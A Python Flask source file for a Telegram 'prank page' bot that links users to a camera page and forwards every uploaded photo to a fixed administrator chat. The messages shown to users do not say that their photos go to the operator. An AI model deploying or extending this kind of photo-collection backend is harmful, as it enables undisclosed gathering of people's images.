import os
import threading
import time
import requests
from flask import Flask, request, jsonify, send_from_directory

BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "").strip()
SITE_URL = os.environ.get("SITE_URL", "").strip().rstrip("/")
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "change-this-secret").strip()

if not BOT_TOKEN or not SITE_URL:
    raise RuntimeError("Set BOT_TOKEN and SITE_URL in environment variables.")

app = Flask(__name__)

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

def tg(method, payload=None, files=None):
    r = requests.post(f"{TELEGRAM_API}/{method}", data=payload or {}, files=files, timeout=30)
    r.raise_for_status()
    return r.json()

def send_message(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    return tg("sendMessage", payload)

def send_photo(chat_id, photo_bytes, filename="photo.jpg"):
    return tg(
        "sendPhoto",
        payload={"chat_id": chat_id, "caption": "📸 صورة جديدة من صفحة المقلب"},
        files={"photo": (filename, photo_bytes, "image/jpeg")}
    )

def process_update(update):
    msg = update.get("message") or update.get("edited_message")
    if not msg:
        return

    chat_id = str(msg["chat"]["id"])
    text = (msg.get("text") or "").strip()

    if text.startswith("/start"):
        keyboard = {
            "inline_keyboard": [[
                {"text": "📸 فتح صفحة المقلب", "url": SITE_URL}
            ]]
        }
        send_message(
            chat_id,
            "😂 أهلاً! اضغط الزر لفتح صفحة الكاميرا. "
            "التصوير يتم فقط بعد موافقتك على إذن الكاميرا وضغط زر الالتقاط.",
            keyboard
        )
    elif text.startswith("/id"):
        send_message(chat_id, f"Chat ID بتاعك هو:\n{chat_id}")
    else:
        send_message(chat_id, "اكتب /start لفتح الصفحة أو /id لمعرفة Chat ID.")

def set_webhook():
    url = f"{SITE_URL}/telegram-webhook/{WEBHOOK_SECRET}"
    try:
        result = tg("setWebhook", {"url": url, "drop_pending_updates": True})
        print("Webhook:", result)
    except Exception as e:
        print("Webhook setup failed:", e)

@app.get("/")
def home():
    return send_from_directory(".", "index.html")

@app.post(f"/telegram-webhook/<secret>")
def telegram_webhook(secret):
    if secret != WEBHOOK_SECRET:
        return jsonify({"ok": False}), 403

    update = request.get_json(silent=True) or {}
    try:
        process_update(update)
    except Exception as e:
        print("Telegram update error:", e)

    return jsonify({"ok": True})

@app.post("/upload")
def upload():
    if not ADMIN_CHAT_ID:
        return jsonify({"ok": False, "error": "ADMIN_CHAT_ID is not set"}), 500

    photo = request.files.get("photo")
    if not photo:
        return jsonify({"ok": False, "error": "No photo"}), 400

    data = photo.read()
    if not data:
        return jsonify({"ok": False, "error": "Empty photo"}), 400

    try:
        send_photo(ADMIN_CHAT_ID, data, "camera-photo.jpg")
        return jsonify({"ok": True})
    except Exception as e:
        print("Photo send error:", e)
        return jsonify({"ok": False}), 500

@app.get("/health")
def health():
    return "OK", 200

if __name__ == "__main__":
    set_webhook()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", "10000")))
else:
    # Gunicorn imports this module; configure webhook in a background thread.
    threading.Thread(target=set_webhook, daemon=True).start()
